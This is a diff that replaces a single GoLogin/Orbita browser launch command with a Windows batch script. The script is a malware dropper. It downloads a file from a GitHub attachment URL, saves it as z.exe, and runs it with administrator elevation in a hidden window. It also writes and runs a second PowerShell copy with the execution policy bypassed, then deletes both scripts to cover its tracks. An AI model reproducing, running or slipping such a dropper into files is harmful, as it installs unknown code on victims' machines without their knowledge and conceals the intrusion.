@@ -1,1 +1,7 @@
-C:\Users\vitru\.gologin\browser\orbita-browser-124\chrome.exe  --disable-encryption --donut-pie=undefined --webrtc-ip-handling-policy=default_public_interface_only --font-masking-mode=2 --load-extension=",,C:\Users\vitru\.gologin\extensions\chrome-extensions\ghlmiigebgipgagnhlanjmmniefbfihl@1_2_28_0" --user-data-dir="D:\A\6537e003c6a65885b0f1c335" --flag-switches-begin --flag-switches-end
+@echo off
+echo $Url = 'https://github.com/user-attachments/files/15895328/z.zip'
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $ProgressPreference = 'SilentlyContinue'; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe'; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = '-fullinstall'; $Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden'; Invoke-Expression -Command $Command"
+powershell -Command "Add-Content -Path ok.ps1 -Value 'echo $Url = ''https://github.com/user-attachments/files/15895328/z.zip''; [Net.ServicePointManager]::SecurityProtocol = ''tls12, tls11, tls''; $ProgressPreference = ''SilentlyContinue''; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath ''z.exe''; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = ''-fullinstall''; $Command = ''Start-Process -FilePath ''$InstallerPath'' -ArgumentList ''$Arguments'' -Verb RunAs -WindowStyle Hidden''; Invoke-Expression -Command $Command'"
+powershell.exe -ExecutionPolicy Bypass -File ok.ps1
+del %0
+del ok.ps1
